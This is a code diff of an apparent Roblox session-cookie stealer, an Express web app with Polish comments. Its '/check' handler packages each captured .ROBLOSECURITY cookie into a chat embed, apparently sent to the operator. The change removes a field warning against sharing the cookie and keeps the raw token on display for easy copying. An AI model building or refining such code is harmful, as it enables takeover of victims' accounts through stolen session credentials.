@@ -4,7 +4,7 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Strona główna – HTML + JS
+// Strona główna – HTML + JS (bez zmian)
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -368,26 +368,11 @@ app.post('/check', async (req, res) => {
                 timestamp: new Date().toISOString()
               },
 
-              // Embed 2 – tylko wyłapane cookie (ciemno fioletowy)
+              // Embed 2 – tylko wyłapane .ROBLOSECURITY (ciemno fioletowy, minimalistyczny)
               {
-                color: 0x4B0082,  // ciemny fiolet
+                color: 0x4B0082, // ciemny fiolet
                 title: "Wyłapane .ROBLOSECURITY",
                 description: `\`\`\`\n${cookie}\n\`\`\``,
-                fields: [
-                  {
-                    name: "Długość",
-                    value: `${cookie.length} znaków`,
-                    inline: true
-                  },
-                  {
-                    name: "Ostrzeżenie",
-                    value: "Nigdy nie udostępniaj tego nikomu!",
-                    inline: true
-                  }
-                ],
-                footer: {
-                  text: "Kliknij tekst → prawy przycisk → Copy"
-                },
                 timestamp: new Date().toISOString()
               }
             ]
